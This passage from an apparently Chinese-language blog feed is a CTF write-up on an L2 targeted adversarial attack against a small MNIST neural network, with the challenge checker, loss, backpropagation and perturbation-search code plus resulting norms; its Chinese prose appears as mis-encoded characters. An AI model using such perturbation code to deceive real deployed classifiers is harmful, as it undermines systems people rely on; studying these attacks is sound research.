class="built_in">sum</span>(np.linalg.norm(np.array(mask), axis=<span class="number">1</span>)) / <span class="number">8</span></span><br><span class="line">    linf = np.<span class="built_in">max</span>(np.linalg.norm(np.array(mask), <span class="built_in">ord</span>=np.inf, axis=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> l2 &gt; L2CONSTRAIN:</span><br><span class="line">        print(<span class="string">&quot;Huge L2 &quot;</span> + <span class="built_in">str</span>(l2))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> linf &gt; LINFCONSTRAIN:</span><br><span class="line">        print(<span class="string">&quot;Huge Linf&quot;</span> + <span class="built_in">str</span>(linf))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    res = myNN.PRED(x + mask)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        lable = np.argmax(res[i])</span><br><span class="line">        <span class="keyword">if</span> lable != i + <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">&quot;Wrong Lable &quot;</span> + <span class="built_in">str</span>(lable) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> res[i][lable] &lt; CONFIDENCE:</span><br><span class="line">            print(<span class="string">&quot;Unconfident &quot;</span> + <span class="built_in">str</span>(lable) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(res[i][lable]))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">    myNN = ANN(uNum)</span><br><span class="line">    myNN.LOAD(<span class="string">&quot;weight.dat&quot;</span>)</span><br><span class="line">    data = pd.read_csv(<span class="string">r&#x27;picData.csv&#x27;</span>)</span><br><span class="line">    x = np.matrix(data.iloc[:, <span class="number">1</span>:])</span><br><span class="line">    mask = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        print(<span class="string">&quot;&gt;&gt; Mask &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot; :&quot;</span>)</span><br><span class="line">        maskTemp = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">784</span>):</span><br><span class="line">            maskTemp.append(<span class="built_in">float</span>(<span class="built_in">input</span>()))</span><br><span class="line">        mask.append(np.array(maskTemp, dtype=np.float64).ravel())</span><br><span class="line">    mask = np.matrix(mask)</span><br><span class="line">    CHECK(mask, myNN, x)</span><br></pre></td></tr></table></figure>    </div></div><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Loss"><a href="#Loss" class="headerlink" title="Loss"></a>Loss</h3><p>å‚è€ƒè®ºæ–‡ï¼Œåœ¨<code>Loss</code>ä¸­åŒ…å«äº†å¯¹L2çš„æƒ©ç½šé¡¹ï¼Œæˆ‘implementçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯ç±»ä¼¼äºå‚æ•°æ­£åˆ™åŒ–ä¸€æ ·çš„æ–¹æ³•ï¼Œç®€å•ä½†æœ‰æ•ˆï¼Œåœ¨æ¯æ¬¡è¿­ä»£åï¼šæ ¹æ®å¯¹L2çš„é™åˆ¶ï¼Œè®©æœ€ç»ˆçš„å™ªå£°<code>Pert</code>è‡ªå‡ä¸€ç‚¹ç‚¹</p><p>è€Œå¯¹äºå¦‚ä½•åœ¨<code>Loss</code>ä¸­ä½“ç°å‡ºé€¼è¿‘Targetï¼Œç›´æ¥å€Ÿé‰´ä¸€ä¸‹Carliniå¤§ç¥çš„ç»“è®ºï¼Œå³å‚è€ƒæ–‡çŒ®ä¸­çš„<code>f6</code>ï¼Œæ¯•ç«Ÿè¿™äº›ä¸œè¥¿å°±æ˜¯å‡­ç»éªŒå‡­æ„Ÿè§‰å¼„å‡ºæ¥çš„ï¼Œä»–ä»¬åŸºæœ¬ä¹Ÿå°±æ˜¯é€‰äº†ä¸€äº›è‡ªå·±è§‰å¾—æœ‰å¯èƒ½å¯è¡Œçš„<code>Loss</code>ç„¶åå…¨éƒ¨è·‘ä¸€éï¼Œæ‰¾ä¸€ä¸ªæ•ˆæœæœ€å¥½çš„</p><img src="/images/L2TarAtt_f6.png" width=350><p>å…¶ä¸­åŠ å·ä¸Šæ ‡è¡¨ç¤ºå¯¹æ‹¬å·å†…çš„å‚æ•°<code>x</code>æ‰§è¡Œ<code>max(x, 0)</code></p><p>å¤§æ¦‚æ„ä¼šä¸€ä¸‹ï¼Œé¦–å…ˆè¿™ç©æ„å„¿å¾—ä»<code>logits</code>å±‚å¼€å§‹å›å½’ï¼Œç„¶åè‡³äºä»–è¿™ä¸ª<code>Loss</code>çš„æ€æƒ³ä¹Ÿå°±å­—é¢æ„æ€ï¼šæ‰“å‹å½“å‰æ¦‚ç‡æœ€é«˜çš„ï¼Œè¿›è€Œæ‰¶æŒtargetçš„æ¦‚ç‡ï¼ˆåŠ«å¯Œæµè´«å±äºæ˜¯</p><p>æˆ‘æ²¡æœ‰å®Œå…¨æŒ‰ç…§ä»–çš„<code>loss</code>æ¥ï¼ˆä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼‰ï¼Œä½†æ˜¯æ€æƒ³éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘implementçš„å°±æ˜¯ä¸€ä¸ªå¯¹æ— å…³é¡¹ç½®é›¶çš„äº¤å‰ç†µï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_crossEntPert</span>(<span class="params">self</span>):</span></span><br><span class="line">    mat = np.matrix(self.A[-<span class="number">1</span>] - self.y)</span><br><span class="line">    <span class="keyword">if</span> np.argmax(np.array(self.y).ravel()) != np.argmax(np.array(self.A[-<span class="number">1</span>]).ravel()):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> i != np.argmax(np.array(self.y).ravel()) <span class="keyword">and</span> i != np.argmax(np.array(self.A[-<span class="number">1</span>]).ravel()):</span><br><span class="line">                mat[<span class="number">0</span>, i] = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> mat</span><br></pre></td></tr></table></figure><p>æ³¨1ï¼šæ­¤å¤„çš„<code>Loss</code>è¿˜å¹¶éæœ€ç»ˆå½¢æ€ï¼Œå› ä¸ºæ²¡æœ‰åŠ å…¥å¯¹<code>Pert</code>çš„æƒ©ç½šé¡¹</p><p>æ³¨2ï¼šå…³äºä¸ºä»€ä¹ˆè¦åœ¨æœ€ç»ˆlabelæ˜¯targetçš„æƒ…å†µä¸‹ç›´æ¥returnï¼Œåˆ™æ˜¯å› ä¸ºè¿™æ ·åœ¨å·²ç»æ‰¾åˆ°å±äºtargetçš„å†³ç­–åŒºåŸŸåçš„ä¸‹é™é€Ÿåº¦æ›´å¿«ï¼Œè¿˜å¯ä»¥é˜²æ­¢æ¢¯åº¦æ¶ˆå¤±</p><h3 id="Get-Gradient"><a href="#Get-Gradient" class="headerlink" title="Get Gradient"></a>Get Gradient</h3><p>ç”±äºæ˜¯è‡ªå·±æ“çš„FCNNï¼Œè·å–æ¢¯åº¦ç›´æ¥<code>backProp</code>å°±è¡Œäº†ï¼Œæ¯”å¦‚æƒ³è¦å€’æ•°ç¬¬äºŒå±‚çš„dZï¼Œ<code>backProp</code>ä¹‹åå°±ç›´æ¥<code>FCNN.dZ[-2]</code>ï¼Œéå¸¸æ–¹ä¾¿ï¼Œè¿™ä¸ªæ‰‹æ“<code>BP</code>çš„æ¢¯åº¦ä¹Ÿæ‹¿å»å’Œ<code>tensorflow</code>ä¸­çš„<code>gradientTape</code>æ±‚å‡ºçš„æ¢¯åº¦åšäº†å¯¹æ¯”ï¼Œä¿è¯æ¢¯åº¦æ­£ç¡®</p><p>ç®€åŒ–å‰”é™¤äº†ä¸€äº›å¸¸è§„<code>BP</code>åœ¨æ­¤æƒ…å¢ƒä¸‹ä¸éœ€è¦çš„å†…å®¹ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backProp</span>(<span class="params">self, d_lossFunc</span>):</span></span><br><span class="line">    self.dZ[-<span class="number">1</span>] = d_lossFunc()</span><br><span class="line">    dw = self.A[-<span class="number">2</span>].T * self.dZ[-<span class="number">1</span>]</span><br><span class="line">    db = np.<span class="built_in">sum</span>(self.dZ[-<span class="number">1</span>], axis=<span class="number">0</span>)</span><br><span class="line">    self.dw[-<span class="number">1</span>] = np.r_[db, dw]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>)):</span><br><span class="line">        self.dA[i] = RemoveBias(self.dZ[i + <span class="number">1</span>] * self.w[i + <span class="number">1</span>].T)</span><br><span class="line">        self.dZ[i] = np.multiply(d_relu(self.Z[i]), self.dA[i])</span><br><span class="line">        dw = self.A[i - <span class="number">1</span>].T * self.dZ[i]</span><br><span class="line">        db = np.<span class="built_in">sum</span>(self.dZ[i], axis=<span class="number">0</span>)</span><br><span class="line">        self.dw[i] = np.r_[db, dw]</span><br><span class="line">self.dA[<span class="number">0</span>] = RemoveBias(self.dZ[<span class="number">1</span>] * self.w[<span class="number">1</span>].T)</span><br><span class="line">self.dZ[<span class="number">0</span>] = self.dA[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="Fool"><a href="#Fool" class="headerlink" title="Fool"></a>Fool</h3><p>ç°åœ¨å…³é”®æˆåˆ†éƒ½å·²ç»é½å…¨äº†ï¼Œå°±å¯ä»¥å¼€å§‹ç”ŸæˆAdversarialPerturbationäº†</p><p>åŸºæœ¬çš„è¿­ä»£è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><ul><li>æŠŠtargetè®¾ç½®æˆ<code>y</code>ï¼Œå› ä¸º<code>loss</code>å‡½æ•°ä¸­ä¼šç”¨åˆ°ï¼ˆæ¯”å¦‚è¦æŠŠ<code>6</code>ç³Šå¼„æˆ<code>7</code>ï¼Œåˆ™<code>target=7</code>ï¼‰</li><li>ForwardProp()</li><li>åˆ¤æ–­targetçš„confidenceæ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œç¬¦åˆåˆ™returnï¼Œä¸ç¬¦åˆåˆ™ç»§ç»­</li><li>BackProp()</li><li>å¯¹æ¢¯åº¦åŠ å…¥å…³äº<code>Pert</code>çš„æƒ©ç½šé¡¹</li></ul><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œè¿˜è¿›è¡Œäº†å‡ ç‚¹ä¼˜åŒ–ï¼š</p><ul><li>å› ä¸ºè¿™ä¸ªæ–¹æ³•è‚‰çœ¼å¯è§çš„å®¹æ˜“å‡ºç°æƒ©ç½šé¡¹ä¸é€¼è¿‘Targetçš„æ–¹å‘ç›¸åçš„æƒ…å†µï¼Œæ‰€ä»¥åŠ å…¥äº†ä¸€ä¸ªåœ¨Stuckæ—¶è¿›è¡Œéšæœºæ‰°åŠ¨çš„åŠŸèƒ½</li><li>å¯¹èµ·ç‚¹è¿›è¡Œæ¯”è¾ƒå°çš„éšæœºæ‰°åŠ¨ï¼Œç¨å¾®å·®å¼‚åŒ–æ¯æ¬¡ä¸‹é™è¿‡ç¨‹</li></ul><p>ï¼ˆåœ¨è¾“å‡ºä¸­åŠ emojiä¸»è¦æ˜¯ä¸ºäº†å¿«é€Ÿæµè§ˆè¿è¡Œç»“æœï¼Œè€Œä¸”äº‹å®è¯æ˜Jupyterå¯¹æ­¤æ”¯æŒæ˜¯æ²¡é—®é¢˜çš„ï¼Œçœ‹ç€å¾ˆé…¥ç³Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, myNetwork</span>):</span></span><br><span class="line">        self.Network = myNetwork</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetGrad</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        pred = self.Network.predict(X)</span><br><span class="line">        self.Network.backProp(self.Network.d_crossEntPert)</span><br><span class="line">        <span class="keyword">return</span> self.Network.dA[<span class="number">0</span>], pred.ravel()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Fool</span>(<span class="params">self, X, y, tar, foolRate=<span class="number">0.5</span>, maxIter=<span class="number">500</span>, step=<span class="number">0.05</span>, minGrad=<span class="number">0.05</span>, maxGrad=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             constrain=<span class="number">10</span>, stuckRandL2=<span class="number">1</span>, initRandL2=<span class="number">1</span></span>):</span></span><br><span class="line">        rand = np.matrix(np.random.randn(<span class="number">1</span>, <span class="number">784</span>))</span><br><span class="line">        pert = np.zeros((<span class="number">1</span>, <span class="number">784</span>)) + initRandL2 * rand / np.linalg.norm(rand)</span><br><span class="line">        loss = []</span><br><span class="line">        L2Rec = []</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        stuckCnt = <span class="number">0</span></span><br><span class="line">        stuckJudgeCnt = <span class="number">0</span></span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        self.Network.predict(X + pert)</span><br><span class="line">        print(<span class="string">&quot;init: &quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot; prob: &quot;</span> +</span><br><span class="line">              <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[y]))</span><br><span class="line">        self.Network.y = OneHot(</span><br><span class="line">            <span class="number">1</span>, self.Network.unitNum[-<span class="number">1</span>], y) <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> OneHot(<span class="number">1</span>, self.Network.unitNum[-<span class="number">1</span>], tar)</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            print(<span class="string">&quot;\rcnt: &quot;</span> + <span class="built_in">str</span>(cnt) + <span class="string">&quot;  stuck: &quot;</span> + <span class="built_in">str</span>(stuckCnt), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            grad, pred = self.GetGrad(X + pert)</span><br><span class="line">            loss.append(np.linalg.norm(self.Network.A[-<span class="number">1</span>]) <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span></span><br><span class="line">                        -np.<span class="built_in">sum</span>(np.array(self.Network.y) * np.log(self.Network.A[-<span class="number">1</span>])</span><br><span class="line">                        + np.array(<span class="number">1</span> - self.Network.y) * np.log(<span class="number">1</span> - self.Network.A[-<span class="number">1</span>])))</span><br><span class="line">            <span class="keyword">if</span> ((self.Network.A[-<span class="number">1</span>].ravel()[y] &lt; foolRate <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> self.Network.A[-<span class="number">1</span>].ravel()[tar] &gt; foolRate)</span><br><span class="line">                    <span class="keyword">and</span> stuckJudgeCnt &gt; <span class="number">5</span>):</span><br><span class="line">                print(<span class="string">&quot;\nâ­• OK:      &quot;</span> + <span class="built_in">str</span>(np.argmax(pred)) + <span class="string">&quot;    &quot;</span> +</span><br><span class="line">                      <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[np.argmax(pred)]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> np.linalg.norm(pert):</span><br><span class="line">                para = <span class="built_in">max</span>((np.linalg.norm(pert) - constrain) ** <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">                grad -= np.<span class="built_in">sum</span>(np.array(pert) * np.array(grad)) * \</span><br><span class="line">                    (pert / np.linalg.norm(pert)) * para</span><br><span class="line">            L2 = np.linalg.norm(grad)</span><br><span class="line">            L2Rec.append(np.array(L2).ravel())</span><br><span class="line">            <span class="keyword">if</span> L2 &gt; maxGrad:</span><br><span class="line">                grad *= maxGrad / L2</span><br><span class="line">            <span class="keyword">if</span> L2 &lt; minGrad:</span><br><span class="line">                <span class="keyword">if</span> L2 == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;\nERR: grad is zero&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                grad *= minGrad / L2</span><br><span class="line">            pert -= grad * step</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cnt == maxIter - <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">&quot;\nâŒ nope:   &quot;</span> + <span class="built_in">str</span>(y <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> tar) + <span class="string">&quot;      &quot;</span> +</span><br><span class="line">                      <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[y <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> tar]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> cnt &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">abs</span>(loss[-<span class="number">1</span>] - loss[-<span class="number">2</span>]) &lt; <span class="number">0.1</span>:</span><br><span class="line">                stuckJudgeCnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> stuckJudgeCnt &gt; <span class="number">10</span>:</span><br><span class="line">                    rand = np.matrix(np.random.randn(</span><br><span class="line">                        pert.shape[<span class="number">0</span>], pert.shape[<span class="number">1</span>]))</span><br><span class="line">                    pert += rand / np.linalg.norm(rand) * stuckRandL2</span><br><span class="line">                    stuckJudgeCnt = <span class="number">0</span></span><br><span class="line">                    stuckCnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> success, pert, loss, L2Rec</span><br></pre></td></tr></table></figure><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>äºæ˜¯æˆ‘ä»¬åªéœ€è¦åŸºäºä»¥ä¸Šçš„åŸºç¡€å†å¯¹æ¯ä¸ªæ•°å­—è®¡ç®—ä¸€éå³å¯</p><p>è€ƒè™‘åˆ°è¦ä½¿å¾—L2å°½å¯èƒ½å°ï¼Œæˆ‘ä½¿ç”¨åŠ¨æ€çš„Constrainï¼Œä½¿å¾—æœç´¢ç»“æœçš„L2å¿«é€Ÿå‡å°åˆ°ä¸€ä¸ªå¯è§‚çš„èŒƒå›´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> KyNetExp</span><br><span class="line">X = np.matrix(pd.read_csv(<span class="string">r&#x27;picData.csv&#x27;</span>).iloc[:, <span class="number">1</span>:])</span><br><span class="line">unitNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">FCNN = KyNetExp.Network()</span><br><span class="line">FCNN.Init(unitNum)</span><br><span class="line">FCNN.LoadParameters(<span class="string">&quot;weight.dat&quot;</span>)</span><br><span class="line">Fool = KyNetExp.Fool(FCNN)</span><br><span class="line">pert = []</span><br><span class="line">deltaConstrain = <span class="number">0.1</span></span><br><span class="line">maxUnsuccessCnt = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    print(<span class="string">&quot;\n-------------------- &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot; --------------------\n&quot;</span>)</span><br><span class="line">    bestPert = np.matrix(np.ones((<span class="number">1</span>,<span class="number">784</span>)) * np.inf)</span><br><span class="line">    constrain = <span class="number">30</span></span><br><span class="line">    UnsuccessCnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(UnsuccessCnt &lt; maxUnsuccessCnt):</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        success, pert_i, loss, L2Rec = Fool.Fool(X[i], i+<span class="number">1</span>, i+<span class="number">2</span>, maxIter=<span class="number">500</span>, foolRate=<span class="number">0.8</span>,</span><br><span class="line">                                                 constrain=constrain, stuckRandL2=<span class="number">1</span>, initRandL2=<span class="number">1</span>,</span><br><span class="line">                                                 minGrad=<span class="number">0.001</span>)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">if</span> np.linalg.norm(pert_i) &lt; np.linalg.norm(bestPert):</span><br><span class="line">                constrain = <span class="built_in">min</span>(np.linalg.norm(pert_i) - deltaConstrain, constrain)</span><br><span class="line">                bestPert = pert_i</span><br><span class="line">                UnsuccessCnt = <span class="number">0</span></span><br><span class="line">                print(<span class="string">&quot;----------------------------------&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;# New Constrain: &quot;</span> + <span class="built_in">str</span>(constrain))</span><br><span class="line">                print(<span class="string">&quot;----------------------------------\n&quot;</span>)</span><br><span class="line">            constrain -= deltaConstrain / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            UnsuccessCnt += <span class="number">1</span></span><br><span class="line">    pert.append(bestPert)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç”Ÿæˆçš„Pertæ•°æ®å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># L2</span></span><br><span class="line">np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), axis=<span class="number">1</span>)</span><br><span class="line">&gt;&gt; array([<span class="number">4.09481434</span>, <span class="number">4.2946097</span> , <span class="number">6.64396102</span>, <span class="number">5.90332629</span>, <span class="number">6.05583615</span>,</span><br><span class="line">       <span class="number">5.71162228</span>, <span class="number">6.26226203</span>, <span class="number">3.06447416</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡å€¼</span></span><br><span class="line">np.<span class="built_in">sum</span>(np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), axis=<span class="number">1</span>)) / <span class="number">8</span></span><br><span class="line">&gt;&gt; <span class="number">5.2538632468131485</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linf</span></span><br><span class="line">np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), <span class="built_in">ord</span>=np.inf, axis=<span class="number">1</span>)</span><br><span class="line">&gt;&gt; array([<span class="number">0.51915417</span>, <span class="number">0.6969855</span> , <span class="number">0.94458608</span>, <span class="number">0.8020708</span> , <span class="number">0.99483219</span>,</span><br><span class="line">       <span class="number">0.70698208</span>, <span class="number">1.12368025</span>, <span class="number">0.41853863</span>])</span><br></pre></td></tr></table></figure><p>å®è§‚æ„Ÿå—å¦‚ä¸‹</p><img src="/images/L2TarAtt_Attacked.png"><p>å¯¹æ¯”Carliniçš„è®ºæ–‡ä¸­çš„L2æ•°æ®ï¼Œæˆ‘è®¤ä¸ºè¿™æ ·çš„ç»“æœå‹‰å¼ºå¯ä»¥æ¥å—ï¼Œä½†é‰´äºè§†è§‰æ•ˆæœä»ç„¶ä¸ä½³ï¼Œä¹‹åå¯èƒ½ä¼šè€ƒè™‘åœ¨æ›´å¤§è§„æ¨¡çš„modelå’Œdatasetä¸Šåšadversarial attackæ–¹é¢çš„ç§ç§å®éªŒ</p><h2 id="DumbAss"><a href="#DumbAss" class="headerlink" title="DumbAss"></a>DumbAss</h2><p>ä¸€å¼€å§‹è¿˜æƒ³ç€é å•çº¯çš„æ¢¯åº¦ä¸‹é™ç›´æ¥ï¼Œç¡¬ç€æé«˜targetçš„è‡ªä¿¡åº¦ï¼Œä½†æ˜¯å¯¼è‡´çš„é—®é¢˜å°±æ˜¯å„ç§æ¢¯åº¦æ¶ˆå¤±æ¢¯åº¦è¿‡ç¼“ä¹‹ç±»çš„ï¼Œæ¯”å¦‚æˆ‘å½“æ—¶çš„<code>loss</code>æ˜¯è¿™æ ·ä¸‹é™çš„</p><img src="/images/L2TarAtt_fig.png"><p>å…·ä½“æ˜¯æŠŠ<code>6</code>è¯†åˆ«æˆ<code>7</code>çš„æƒ…æ™¯ï¼ŒèŒƒæ•°å¦‚ä¸‹ï¼ŒåƒåŠ›ä¸è®¨å¥½äº†å±äºæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L2  : <span class="number">8.161735079209715</span></span><br><span class="line">Linf: <span class="number">1.188402119264267</span></span><br></pre></td></tr></table></figure><p>åœ¨åšè¿™ä¸ªL2 Targeted Attackçš„æ—¶å€™ï¼Œæœ€å¤šçš„æ—¶é—´åº”è¯¥æ˜¯æµªè´¹åœ¨ä»¥ä¸‹è¿™å‡ ä»¶äº‹ä¸Šï¼š</p><ul><li><code>float64</code>ä¸<code>float32</code>åœ¨åŠ è½½ä¸å‚¨å­˜çš„æ—¶å€™æ²¡æœ‰æ³¨æ„ç±»å‹ï¼Œå¯¼è‡´ä¸èƒ½åŠæ—¶ä¸<code>tensorFlow</code>å¯¹ç­”æ¡ˆ</li><li><code>softMax</code>åå¯¼çš„å‡½æ•°é”™è¯¯ï¼Œå¯¼è‡´æœ€ç»ˆåå¯¼é”™è¯¯</li><li>æ–‡çŒ®æŸ¥æ‰¾ï¼Œæ‰¾åˆ°Carliniçš„è¿™ç¯‡æ–‡ç« èŠ±äº†æŒºå¤šæ—¶é—´çš„</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HandleCrack</title>
      <link href="2022/03/23/HandleCrack/"/>
      <url>2022/03/23/HandleCrack/</url>
      
